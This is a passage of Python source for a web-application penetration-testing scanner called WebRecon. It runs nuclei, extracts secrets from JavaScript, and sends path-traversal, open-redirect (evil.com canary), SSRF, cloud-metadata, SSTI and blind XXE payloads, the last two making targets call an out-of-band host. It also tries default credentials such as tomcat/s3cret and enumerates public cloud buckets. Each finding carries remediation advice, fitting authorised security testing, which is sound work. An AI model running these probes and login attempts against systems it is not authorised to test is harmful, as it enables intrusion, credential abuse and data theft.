                 "-useragent", cfg.user_agent], "Nikto", out, cfg, 900)
    st.mark(phase)


def phase_nuclei(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Nuclei template-based scanner. Replaces/augments much of Nikto's coverage."""
    phase = "nuclei"
    if st.done(phase): return
    section(f"Nuclei Template Scan ({cfg.nuclei_severity})", out)
    if not _tool_ok("nuclei", out):
        _log(out, "> nuclei not installed — `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`")
        st.mark(phase); return

    output_file = f"/tmp/nuclei_{hashlib.md5(target.encode()).hexdigest()}.jsonl"
    cmd = ["nuclei", "-u", cfg.base_url, "-severity", cfg.nuclei_severity,
           "-jsonl", "-o", output_file, "-silent",
           "-c", str(min(cfg.threads * 5, 25)),
           "-rate-limit", str(cfg.rate),
           "-timeout", "10"]
    if cfg.proxy:
        cmd += ["-proxy", cfg.proxy]
    if cfg.cookie:
        cmd += ["-H", f"Cookie: {cfg.cookie}"]
    for h in cfg.extra_headers:
        cmd += ["-H", h]
    if cfg.no_intrusive:
        cmd += ["-etags", "intrusive,fuzz,dos"]

    run_cmd(cmd, "nuclei scan", out, cfg, 1800)

    if os.path.exists(output_file):
        sev_map = {
            "info":     Severity.INFO,
            "low":      Severity.LOW,
            "medium":   Severity.MEDIUM,
            "high":     Severity.HIGH,
            "critical": Severity.CRITICAL,
            "unknown":  Severity.INFO,
        }
        count = 0
        with open(output_file) as fh:
            for line in fh:
                try:
                    entry = json.loads(line)
                    info = entry.get('info', {})
                    sev = sev_map.get(str(info.get('severity', 'info')).lower(),
                                      Severity.INFO)
                    name = info.get('name', entry.get('template-id', 'unknown'))
                    matched = entry.get('matched-at', entry.get('host', cfg.base_url))
                    add_finding(Finding(
                        title=f"Nuclei: {name}",
                        severity=sev,
                        description=info.get('description', name)[:500],
                        evidence=f"Matched: {matched}\nTemplate: {entry.get('template-id','')}\nTags: {info.get('tags','')}",
                        recommendation=info.get('remediation', 'See nuclei template for remediation.')[:500] if info.get('remediation') else "Review matched template for remediation guidance.",
                        phase=phase), out, cfg)
                    count += 1
                except Exception:
                    continue
        _log(out, f"\n## Nuclei Summary: {count} findings")
    st.mark(phase)


def phase_js_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "js_analysis"
    if st.done(phase): return
    section("JavaScript Secret Extraction", out)

    PATTERNS = {
        "AWS Access Key":   r"AKIA[0-9A-Z]{16}",
        "Generic API Key":  r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,64}['\"]",
        "Generic Token":    r"(?i)(token|access_token|auth_token)\s*[=:]\s*['\"][a-zA-Z0-9_.\-]{16,}['\"]",
        "Private Key":      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
        "Google API Key":   r"AIza[0-9A-Za-z\-_]{35}",
        "Slack Token":      r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "GitHub Token":     r"ghp_[0-9a-zA-Z]{36}",
        "JWT":              r"eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}",
        "Basic Auth in URL":r"https?://[a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+@",
        "Hardcoded Password":r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{6,}['\"]",
        "Internal IP":      r"(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)(?:\d{1,3}\.){2}\d{1,3}",
    }

    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        js_urls = set()
        for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
            p = m.group(1)
            if p.startswith('http'):      js_urls.add(p)
            elif p.startswith('//'):      js_urls.add(f"https:{p}")
            else:                         js_urls.add(urljoin(cfg.base_url, p))

        # Augment with JS URLs discovered by crawler
        with DISCOVERED._lock:
            for u in DISCOVERED.urls:
                if u.endswith('.js') or '.js?' in u:
                    js_urls.add(u)

        _log(out, f"Analysing {len(js_urls)} JS files...")
        print(f"  {Fore.CYAN}ℹ Scanning {len(js_urls)} JS files for secrets")

        for js_url in list(js_urls)[:30]:
            try:
                jr = sess.get(js_url, timeout=cfg.timeout)
                if not jr.ok: continue
                for name, pat in PATTERNS.items():
                    hits = re.findall(pat, jr.text)
                    if hits:
                        add_finding(Finding(
                            title=f"Potential Secret in JS: {name}",
                            severity=Severity.HIGH,
                            description=f"Pattern `{name}` matched in `{js_url}`",
                            evidence=f"File: {js_url}\nMatches:\n" + '\n'.join(str(h)[:100] for h in hits[:5]),
                            recommendation="Remove secrets from client-side JS. Use server-side env variables.",
                            phase=phase), out, cfg)
            except Exception:
                continue
    except Exception as e:
        _log(out, f"> JS analysis failed: {e}")
    st.mark(phase)


def phase_graphql(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "graphql"
    if st.done(phase): return
    section("GraphQL Endpoint Detection", out)
    paths = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
             "/playground", "/graphql/console", "/api/v1/graphql"]
    sess = make_session(cfg)
    for path in paths:
        url = f"{cfg.base_url}{path}"
        try:
            r = sess.post(url, json={"query": "{__schema{queryType{name}}}"},
                          timeout=cfg.timeout)
            if r.status_code in (200, 201) and ('__schema' in r.text or 'data' in r.text):
                add_finding(Finding(
                    title=f"GraphQL Endpoint: {path}",
                    severity=Severity.MEDIUM,
                    description=f"GraphQL found at {url}. Introspection may be enabled.",
                    evidence=f"POST {url} → HTTP {r.status_code}\n{r.text[:400]}",
                    recommendation="Disable introspection in production. Add depth/complexity limits and auth.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_path_traversal(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "path_traversal"
    if st.done(phase): return
    section("Path Traversal Probe", out)
    payloads = ["../etc/passwd", "../../etc/passwd", "....//....//etc/passwd",
                "..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd", "../windows/win.ini"]
    indicators = ["root:x:0:0", "daemon:", "[extensions]", "bin/bash"]
    sess = make_session(cfg)
    for pl in payloads:
        try:
            r = sess.get(f"{cfg.base_url}/{pl}", timeout=cfg.timeout, allow_redirects=False)
            for ind in indicators:
                if ind in r.text:
                    add_finding(Finding(
                        title="Path Traversal Vulnerability",
                        severity=Severity.CRITICAL,
                        description="Path traversal payload returned sensitive file contents.",
                        evidence=f"Payload: {pl}\nHTTP {r.status_code}\nIndicator: {ind}\n{r.text[:400]}",
                        recommendation="Sanitise path inputs. Use allowlists. Avoid passing user input to filesystem calls.",
                        phase=phase), out, cfg)
                    break
        except Exception:
            continue

    # Also test discovered params for path traversal
    with DISCOVERED._lock:
        params = list(DISCOVERED.params)[:10]
    for param in params:
        for pl in payloads[:3]:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}", timeout=cfg.timeout)
                for ind in indicators:
                    if ind in r.text:
                        add_finding(Finding(
                            title=f"Path Traversal via `{param}`",
                            severity=Severity.CRITICAL,
                            description=f"Parameter `{param}` is vulnerable to path traversal.",
                            evidence=f"URL: {cfg.base_url}?{param}={pl}\nIndicator: {ind}",
                            recommendation="Validate/canonicalise path inputs. Use allowlists.",
                            phase=phase), out, cfg)
                        break
            except Exception:
                continue
    st.mark(phase)


def phase_open_redirect(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "open_redirect"
    if st.done(phase): return
    section("Open Redirect Probe", out)
    params = ["redirect", "url", "next", "return", "returnUrl", "goto",
              "destination", "continue", "redir", "redirect_uri", "target"]
    # Augment with discovered params
    with DISCOVERED._lock:
        params = list(set(params + [p for p in DISCOVERED.params
                                     if any(k in p.lower() for k in
                                            ('redirect', 'url', 'return', 'next', 'goto'))]))
    canary = "https://evil.com/openredirect-canary"
    sess = make_session(cfg)
    for param in params:
        try:
            r = sess.get(f"{cfg.base_url}?{param}={canary}",
                         timeout=cfg.timeout, allow_redirects=False)
            if "evil.com" in r.headers.get("Location", ""):
                add_finding(Finding(
                    title=f"Open Redirect: `{param}` parameter",
                    severity=Severity.MEDIUM,
                    description=f"Parameter `{param}` reflects external URL in Location header.",
                    evidence=f"URL: {cfg.base_url}?{param}={canary}\nLocation: {r.headers.get('Location')}",
                    recommendation="Validate redirect targets against an allowlist of permitted domains.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_ssrf(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """OOB-based SSRF probe across discovered parameters."""
    phase = "ssrf"
    if st.done(phase): return
    section("SSRF Probe", out)
    if not cfg.oob_url:
        _log(out, "> SSRF skipped — no --oob-url provided.")
        print(f"  {Fore.YELLOW}⚠ SSRF skipped — provide --oob-url")
        st.mark(phase); return

    sess = make_session(cfg)

    # Common SSRF-prone parameter names
    common = ['url', 'uri', 'path', 'src', 'dest', 'redirect', 'target', 'host',
              'site', 'file', 'document', 'page', 'feed', 'image', 'load',
              'fetch', 'proxy', 'callback', 'link', 'ref']

    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:30]

    hits_sent = 0
    for param in params:
        marker = hashlib.md5(param.encode()).hexdigest()[:8]
        payload = f"http://{marker}.{cfg.oob_url}/"
        # Test as GET parameter
        try:
            sess.get(f"{cfg.base_url}?{param}={payload}",
                     timeout=cfg.timeout, allow_redirects=False)
            hits_sent += 1
        except Exception:
            pass
        # Test as JSON body against discovered endpoints
        for ep in list(DISCOVERED.endpoints)[:5]:
            try:
                url = urljoin(cfg.base_url, ep)
                sess.post(url, json={param: payload},
                          timeout=cfg.timeout)
                hits_sent += 1
            except Exception:
                continue

    # Cloud metadata sweep
    metadata_targets = [
        "http://169.254.169.254/latest/meta-data/",     # AWS
        "http://169.254.169.254/computeMetadata/v1/",   # GCP
        "http://metadata.google.internal/",             # GCP
        "http://169.254.169.254/metadata/v1/",          # DigitalOcean
        "file:///etc/passwd",
    ]
    for meta in metadata_targets:
        for param in ('url', 'uri', 'src'):
            try:
                r = sess.get(f"{cfg.base_url}?{param}={meta}",
                             timeout=cfg.timeout)
                if any(s in r.text for s in ('ami-id', 'iam/security-credentials',
                                              'instance-id', 'root:x:0:0')):
                    add_finding(Finding(
                        title=f"SSRF to Cloud Metadata via `{param}`",
                        severity=Severity.CRITICAL,
                        description=f"Parameter `{param}` fetches cloud metadata service.",
                        evidence=f"URL: {cfg.base_url}?{param}={meta}\nResponse: {r.text[:300]}",
                        recommendation="Block outbound requests to link-local metadata IPs. Use IMDSv2 (AWS). Validate URL scheme/host.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    add_finding(Finding(
        title=f"SSRF OOB Probes Sent ({hits_sent} requests)",
        severity=Severity.INFO,
        description=f"SSRF payloads with marker-prefixed subdomains sent. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence=f"OOB base: {cfg.oob_url}\nParameters tested: {len(params)}",
        recommendation="Correlate DNS callbacks by the 8-char marker prefix → parameter name.",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_ssti(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Server-side template injection detection across discovered parameters."""
    phase = "ssti"
    if st.done(phase): return
    section("SSTI Probe", out)

    sess = make_session(cfg)
    # Each payload evaluates to a unique deterministic value
    payloads = [
        ("{{7*7}}",     "49",  "Jinja2/Twig"),
        ("${7*7}",      "49",  "FreeMarker/JSP-EL"),
        ("<%= 7*7 %>",  "49",  "ERB/EJS"),
        ("#{7*7}",      "49",  "Ruby/Thymeleaf"),
        ("{{7*'7'}}",   "7777777", "Jinja2"),
        ("${{7*7}}",    "49",  "Handlebars-like"),
        ("@(7*7)",      "49",  "Razor"),
    ]

    common = ['name', 'search', 'query', 'q', 'msg', 'message', 'greeting',
              'title', 'content', 'input', 'text']
    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:20]

    for param in params:
        for pl, expected, engine in payloads:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}",
                             timeout=cfg.timeout)
                # Check for evaluated result AND absence of raw payload
                if expected in r.text and pl not in r.text[:10000]:
                    add_finding(Finding(
                        title=f"SSTI ({engine}) via `{param}`",
                        severity=Severity.CRITICAL,
                        description=f"Parameter `{param}` appears to evaluate template expressions ({engine}).",
                        evidence=f"URL: {cfg.base_url}?{param}={pl}\nPayload: {pl}\nExpected: {expected}\nReflected in response.",
                        recommendation="Never pass user input to template engines as template code. Use parameterised rendering (context data only).",
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)


def phase_xxe(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Enhanced XXE: multiple content types, parameter-entity blind payload."""
    phase = "xxe"
    if st.done(phase): return
    section("XXE Probe", out)
    if not cfg.oob_url:
        _log(out, "> XXE skipped — no --oob-url provided.")
        print(f"  {Fore.YELLOW}⚠ XXE skipped — provide --oob-url")
        st.mark(phase); return

    # Classic external entity
    payload_classic = (f'<?xml version="1.0"?>\n'
                       f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-classic">]>\n'
                       f'<root><data>&xxe;</data></root>')

    # Parameter-entity blind (defeats many modern parsers that disable external entities
    # but not external DTDs)
    payload_blind = (f'<?xml version="1.0"?>\n'
                     f'<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://{cfg.oob_url}/xxe-blind-dtd">%xxe;]>\n'
                     f'<root/>')

    # SOAP envelope
    payload_soap = (f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-soap">]>\n'
                    f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
                    f'<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>')

    # SVG-embedded XXE
    payload_svg = (f'<?xml version="1.0"?>\n'
                   f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-svg">]>\n'
                   f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')

    tests = [
        (payload_classic, "application/xml"),
        (payload_blind,   "application/xml"),
        (payload_soap,    "text/xml"),
        (payload_soap,    "application/soap+xml"),
        (payload_svg,     "image/svg+xml"),
    ]

    sess = make_session(cfg)
    # Test against discovered endpoints + common API paths
    with DISCOVERED._lock:
        endpoints = list(DISCOVERED.endpoints)[:10]
    paths = ["/api/", "/api/v1/", "/upload", "/import", "/xml", "/soap",
             "/parse", "/svg"] + endpoints

    for path in paths:
        for payload, content_type in tests:
            try:
                url = urljoin(cfg.base_url, path)
                sess.post(url, data=payload,
                          headers={"Content-Type": content_type},
                          timeout=cfg.timeout)
            except Exception:
                continue

    add_finding(Finding(
        title="XXE Probes Sent (classic + blind + SOAP + SVG)",
        severity=Severity.INFO,
        description=f"XXE payloads sent across {len(paths)} endpoints and {len(tests)} content-type variants. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence=f"Markers: xxe-classic, xxe-blind-dtd, xxe-soap, xxe-svg",
        recommendation="Disable external entity & external DTD processing in all XML parsers (defusedxml / feature flags).",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_default_creds(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Fixed: success logic rewritten as explicit branches per auth type."""
    phase = "default_creds"
    if st.done(phase): return
    section("Default Credential Testing", out)

    # (indicator_path, login_path, auth_type, user_field, pass_field, user, pwd, success_text, failure_text)
    PLATFORMS = [
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "s3cret",  "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "admin",   "admin",   "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "tomcat",  "Tomcat Web Application Manager", None),
        ("/j_acegi_security_check", "/j_acegi_security_check", "form", "j_username", "j_password", "admin", "admin", None, "loginError"),
        ("/wp-login.php",  "/wp-login.php",           "form", "log", "pwd", "admin", "admin", "wp-admin", "login_error"),
        ("/api/login",     "/api/login",              "json", "user", "password", "admin", "admin", None, None),  # Grafana-like
    ]

    sess = make_session(cfg)

    for indicator, login_path, auth_type, uf, pf, user, pwd, success_text, failure_text in PLATFORMS:
        # Confirm target exposes the platform
        try:
            check = sess.get(f"{cfg.base_url}{indicator}", timeout=cfg.timeout,
                             allow_redirects=False)
            if check.status_code not in (200, 302, 401, 403):
                continue
        except Exception:
            continue

        login_url = f"{cfg.base_url}{login_path}"
        success = False
        evidence = ""

        try:
            if auth_type == "basic":
                # Must have been 401 without creds AND 200 with creds
                if check.status_code != 401:
                    continue
                r = sess.get(login_url, auth=(user, pwd), timeout=cfg.timeout,
                             allow_redirects=False)
                success = (r.status_code == 200 and
                           (not success_text or success_text.lower() in r.text.lower()))
                evidence = f"GET {login_url} (basic auth) → HTTP {r.status_code}"

            elif auth_type == "form":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, data={uf: user, pf: pwd},
                              timeout=cfg.timeout, allow_redirects=True)
                # Success = expected text present AND failure text absent
                body = r.text.lower()
                has_success = success_text and success_text.lower() in body
                has_failure = failure_text and failure_text.lower() in body
                success = bool(has_success and not has_failure)
                evidence = f"POST {login_url} ({uf}={user}) → HTTP {r.status_code}"

            elif auth_type == "json":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, json={uf: user, pf: pwd},
                              timeout=cfg.timeout)
                # Success = 2xx + auth token in body/cookies (heuristic)
                success = (r.status_code in (200, 201) and
                           any(k in r.text.lower() for k in ('token', 'session', 'authenticated', 'success')))
                evidence = f"POST {login_url} (json) → HTTP {r.status_code}\n{r.text[:200]}"

        except Exception as e:
            _log(out, f"> Login attempt failed for {login_path}: {e}")
            continue

        if success:
            add_finding(Finding(
                title=f"Default Credentials Valid: {login_path}",
                severity=Severity.CRITICAL,
                description=f"Default credentials `{user}`/`{pwd}` accepted at {login_path}",
                evidence=evidence,
                recommendation="Change default credentials immediately. Enforce a strong password policy.",
                phase=phase), out, cfg)

    st.mark(phase)


def phase_cloud_buckets(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "cloud_buckets"
    if st.done(phase): return
    section("Cloud Storage Bucket Enumeration", out)

    host = target.split(':')[0]
    parts = host.split('.')
    base_names = [parts[-2] if len(parts) >= 2 else host,
                  host.replace('.', '-'), host.replace('.', '')]
    suffixes = ['', '-backup', '-data', '-assets', '-static', '-media',
                '-uploads', '-dev', '-staging', '-prod', '-files', '-logs']
    sess = make_session(cfg)
    for base in list(dict.fromkeys(base_names))[:2]:
        for suffix in suffixes:
            name = f"{base}{suffix}"
            for url, cloud in [
                (f"https://{name}.s3.amazonaws.com/",         "S3"),
                (f"https://storage.googleapis.com/{name}/",   "GCS"),
                (f"https://{name}.blob.core.windows.net/",    "Azure"),
            ]:
                try:
                    r = sess.get(url, timeout=5)
                    if r.status_code == 200:
                        add_finding(Finding(
                            title=f"Public {cloud} Bucket: {name}",
                            severity=Severity.HIGH,
                            description=f"Publicly accessible {cloud} bucket: {url}",
                            evidence=f"GET {url} → HTTP 200\n{r.text[:300]}",
                            recommendation=f"Restrict {cloud} bucket ACL. Block public access policy.",
                            phase=phase), out, cfg)
                    elif r.status_code == 403:
                        _log(out, f"ℹ️ {cloud} bucket exists (private): {url}")
                except Exception:
                    continue
    st.mark(phase)


def phase_screenshots(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "screenshots"
    if st.done(phase): return
    section("Screenshots (gowitness)", out)
    if _tool_ok("gowitness", out):
        os.makedirs(f"./screenshots", exist_ok=True)
        run_cmd(["gowitness", "single", "--url", cfg.base_url,
                 "--screenshot-path", "./screenshots"],
                "gowitness", out, cfg, 60)
    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# FINAL REPORTS (Markdown + HTML)
# ═════════════════════════════════════════════════════════════════════════════

def write_summary(cfg: ScanConfig, out: str, findings: List[Finding], start: datetime):
    duration = datetime.now() - start
    counts = Counter(f.severity for f in findings)
    _log(out, "\n\n---\n# Summary\n")
    _log(out, f"| Field | Value |\n|---|---|\n"
              f"| Target | `{cfg.target}` |\n"
              f"| Base URL | {cfg.base_url} |\n"
              f"| Profile | {cfg.profile.value} |\n"
              f"| Duration | {str(duration).split('.')[0]} |\n"
              f"| Total Findings | {len(findings)} |\n")
    _log(out, "\n## Findings by Severity\n")
    for sev in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO):
        _log(out, f"- **{sev.value}**: {counts.get(sev, 0)}")

    if cfg.diff_file:
        diff = diff_findings(findings, cfg.diff_file)
        if diff:
            _log(out, "\n## Delta vs Previous Scan\n")
            _log(out, f"- New: {len(diff.get('new', []))}")
            _log(out, f"- Resolved: {len(diff.get('resolved', []))}")
            _log(out, f"- Unchanged: {diff.get('unchanged', 0)}")
            if diff.get('new'):
                _log(out, "\n### New Findings\n" +
                          '\n'.join(f"- [{f['severity']}] {f['title']}" for f in diff['new']))
            if diff.get('resolved'):
                _log(out, "\n### Resolved\n" + '\n'.join(f"- {t}" for t in diff['resolved']))


def write_html_report(cfg: ScanConfig, html_path: str,
                       findings: List[Finding], start: datetime):
    """Emit a self-contained filterable HTML report."""
    duration = datetime.now() - start
    counts = Counter(f.severity for f in findings)
    rows = []
    for i, f in enumerate(sorted(findings, key=lambda x: -_SEV_ORDER[x.severity])):
        rows.append({
            "id": i, "title": f.title, "severity": f.severity.value,
            "description": f.description, "evidence": f.evidence,
            "recommendation": f.recommendation, "phase": f.phase,
            "timestamp": f.timestamp,
        })

    # Escape helper
    def esc(s):
        return (str(s).replace('&', '&amp;').replace('<', '&lt;')
                .replace('>', '&gt;').replace('"', '&quot;'))

    sev_colour = {
        "CRITICAL": "#8b0000", "HIGH": "#e74c3c", "MEDIUM": "#f39c12",
        "LOW":      "#27ae60", "INFO": "#3498db",
    }

    table_rows = ""
    for r in rows:
        c = sev_colour.get(r['severity'], '#555')
        table_rows += (
            f'<tr class="row" data-sev="{r["severity"]}">'
            f'<td><span class="badge" style="background:{c}">{r["severity"]}</span></td>'
            f'<td>{esc(r["title"])}</td>'
            f'<td>{esc(r["phase"])}</td>'
            f'<td><details><summary>show</summary>'
            f'<p><b>Description:</b> {esc(r["description"])}</p>'
            f'<pre>{esc(r["evidence"])}</pre>'
            f'<p><b>Recommendation:</b> {esc(r["recommendation"])}</p>'
            f'<p><i>Time:</i> {esc(r["timestamp"])}</p>'
            f'</details></td></tr>'
        )

    summary_cards = ""
    for sev in (Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO):
        c = sev_colour[sev.value]
        summary_cards += (f'<div class="card" style="border-left-color:{c}">'
                          f'<div class="sev">{sev.value}</div>'
                          f'<div class="num">{counts.get(sev, 0)}</div></div>')

    html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>WebRecon Report — {esc(cfg.target)}</title>
<style>
 * {{ box-sizing:border-box; }}
 body {{ font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
        margin:0; background:#0d1117; color:#c9d1d9; }}
 header {{ background:#161b22; padding:1.5rem 2rem; border-bottom:1px solid #30363d; }}
 h1 {{ margin:0; color:#58a6ff; }}
 .meta {{ color:#8b949e; font-size:.9rem; margin-top:.5rem; }}
 main {{ padding:2rem; max-width:1400px; margin:auto; }}
 .cards {{ display:grid; grid-template-columns:repeat(5, 1fr); gap:1rem; margin-bottom:2rem; }}
 .card {{ background:#161b22; padding:1rem; border-left:4px solid; border-radius:4px; }}
 .sev {{ font-size:.8rem; color:#8b949e; text-transform:uppercase; }}
 .num {{ font-size:2rem; font-weight:bold; color:#f0f6fc; }}
 .filters {{ margin-bottom:1rem; }}
 .filters button {{ background:#21262d; color:#c9d1d9; border:1px solid #30363d;
                   padding:.5rem 1rem; margin-right:.5rem; border-radius:4px; cursor:pointer; }}
 .filters button.active {{ background:#1f6feb; border-color:#1f6feb; color:white; }}
 input[type=text] {{ background:#0d1117; color:#c9d1d9; border:1px solid #30363d;
                    padding:.5rem; width:300px; border-radius:4px; }}
 table {{ width:100%; border-collapse:collapse; background:#161b22; border-radius:4px; overflow:hidden; }}
 th, td {{ padding:.75rem; text-align:left; border-bottom:1px solid #30363d; vertical-align:top; }}
 th {{ background:#21262d; color:#f0f6fc; font-weight:600; }}
 tr:hover {{ background:#1c2128; }}
 .badge {{ color:white; padding:.25rem .5rem; border-radius:3px; font-size:.75rem; font-weight:bold; }}
 pre {{ background:#0d1117; padding:.75rem; border-radius:4px; overflow:auto;
       white-space:pre-wrap; word-break:break-all; max-height:400px; }}
 details summary {{ cursor:pointer; color:#58a6ff; }}
 details[open] summary {{ margin-bottom:.5rem; }}
</style></head>
<body>
<header>
 <h1>WebRecon Report</h1>
 <div class="meta">
  <b>Target:</b> {esc(cfg.target)} &nbsp;|&nbsp;
  <b>Base URL:</b> {esc(cfg.base_url)} &nbsp;|&nbsp;
  <b>Profile:</b> {esc(cfg.profile.value)} &nbsp;|&nbsp;
  <b>Started:</b> {start.isoformat()} &nbsp;|&nbsp;
  <b>Duration:</b> {str(duration).split('.')[0]} &nbsp;|&nbsp;
  <b>Total:</b> {len(findings)} findings
 </div>
</header>
<main>
 <div class="cards">{summary_cards}</div>

 <div class="filters">
  <button class="filterbtn active" data-f="ALL">All</button>
  <button class="filterbtn" data-f="CRITICAL">Critical</button>
  <button class="filterbtn" data-f="HIGH">High</button>
  <button class="filterbtn" data-f="MEDIUM">Medium</button>
  <button class="filterbtn" data-f="LOW">Low</button>
  <button class="filterbtn" data-f="INFO">Info</button>
  <input type="text" id="search" placeholder="Search findings…">
 </div>

 <table>
  <thead><tr><th>Severity</th><th>Title</th><th>Phase</th><th>Details</th></tr></thead>
  <tbody>{table_rows}</tbody>
 </table>
</main>
<script>
 const btns = document.querySelectorAll('.filterbtn');
 const rows = document.querySelectorAll('tr.row');
 const search = document.getElementById('search');
 let activeFilter = 'ALL';
 function apply() {{
   const q = search.value.toLowerCase();
   rows.forEach(r => {{
     const sev = r.dataset.sev;
     const text = r.textContent.toLowerCase();
     const sevOk = activeFilter === 'ALL' || sev === activeFilter;
     const textOk = !q || text.includes(q);
     r.style.display = (sevOk && textOk) ? '' : 'none';
   }});
 }}
 btns.forEach(b => b.addEventListener('click', () => {{
   btns.forEach(x => x.classList.remove('active'));
   b.classList.add('active');
   activeFilter = b.dataset.f;
   apply();
 }}));
 search.addEventListener('input', apply);
</script>
</body></html>"""
    with open(html_path, 'w') as fh:
        fh.write(html)

# ═════════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSING & MAIN
# ═════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = ArgumentParser(
        description="WebRecon v3.0 — Comprehensive Web Application Enumeration",
        formatter_class=RawDescriptionHelpFormatter,
        epilog="""
Examples:
  web_app.py -t example.com
  web_app.py -t example.com --proxy http://127.0.0.1:8080 --oob-url xxx.oast.live
  web_app.py -t example.com --cookie "session=abc123" --auth-check-url https://example.com/profile --auth-check-text "Logout"
  web_app.py -t example.com --profile recon
  web_app.py -t example.com --profile stealth --nuclei-severity high,critical
  web_app.py -t example.com --auto --diff previous.findings.json
  web_app.py -t example.com --webhook-url https://discord.com/api/webhooks/... --pentestdb-url http://pi:5000
  web_app.py -t example.com --resume
        """)
    p.add_argument("-t", "--target",        help="Target domain or IP (host:port also accepted)")
    p.add_argument("-o", "--output",        default="webrecon", help="Output file prefix")
    p.add_argument("--auto",                action="store_true",
                   help="Skip interactive prompts (run all phases non-interactively)")
    p.add_argument("--proxy",               help="Proxy URL (e.g. http://127.0.0.1:8080)")
    p.add_argument("--user-agent",          default=DEFAULT_UA, help="Custom User-Agent")
    p.add_argument("--timeout",             type=int, default=10, help="HTTP timeout (s)")
    p.add_argument("--rate",                type=int, default=50, help="Per-phase thread/rate limit")
    p.add_argument("--delay",               type=float, default=0.0, help="Inter-request delay (s)")
    p.add_argument("--oob-url",             help="OOB callback host for XXE/SSRF (interactsh etc.)")
    p.add_argument("--scope-file",          help="Scope file: CIDRs (v4/v6) or domains, one per line")
    p.add_argument("--full-ports",          action="store_true", help="Full port scan (-p-)")
    p.add_argument("--google-api-key",      help="Google Custom Search API key")
    p.add_argument("--google-cx",           help="Google Custom Search Engine ID")
    p.add_argument("--google-dork-count",   type=int, default=5, help="Number of dorks to run via API (default 5)")
    p.add_argument("--diff",                dest="diff_file", help="Previous findings JSON for diff mode")
    p.add_argument("--resume",              action="store_true", help="Resume interrupted scan")
    p.add_argument("--fresh",               action="store_true", help="Clear state and start fresh")
    p.add_argument("--threads",             type=int, default=5, help="Parallel phase threads")
    p.add_argument("-v", "--verbose",       action="store_true", help="Show tool stderr")
    # Auth
    p.add_argument("--cookie",              help="Session cookie(s): 'name=val; name2=val2'")
    p.add_argument("--header",              action="append", default=[], dest="headers",
                   help="Extra header (repeatable): 'Authorization: Bearer xyz'")
    p.add_argument("--auth-check-url",      help="URL to verify session is still authenticated")
    p.add_argument("--auth-check-text",     help="Text expected in auth-check-url response")
    # Integrations
    p.add_argument("--webhook-url",         help="Discord/Slack webhook for HIGH+ findings")
    p.add_argument("--webhook-threshold",   default="HIGH",
                   choices=["INFO","LOW","MEDIUM","HIGH","CRITICAL"],
                   help="Minimum severity to notify webhook (default HIGH)")
    p.add_argument("--pentestdb-url",       help="PentestDB instance to POST findings to")
    p.add_argument("--pentestdb-token",     help="Bearer token for PentestDB API")
    # Scan control
    p.add_argument("--profile",             choices=[p.value for p in ScanProfile],
                   default=ScanProfile.FULL.value,
                   help="Scan profile: recon=passive only, active=+recon tools, full=everything, stealth=throttled")
